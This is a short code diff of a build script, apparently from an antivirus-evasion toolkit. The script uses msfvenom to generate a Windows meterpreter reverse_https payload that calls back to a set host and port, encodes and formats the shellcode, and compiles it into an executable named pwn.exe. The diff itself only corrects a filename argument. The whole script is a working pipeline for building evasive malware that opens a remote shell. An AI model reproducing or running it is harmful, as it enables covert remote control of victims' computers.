@@ -10,7 +10,7 @@ msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.128 lport=443 -e
 # format the shellcode for make_avet
 ./format.sh sc.txt > thepayload.txt && rm sc.txt
 # call make_avet, the -l compiles the filename into the .exe file 
-./make_avet -l thepayload.exe -E
+./make_avet -l thepayload.txt -E
 # compile to pwn.exe file
 $win32_compiler -o pwn.exe avet.c
 strip pwn.exe
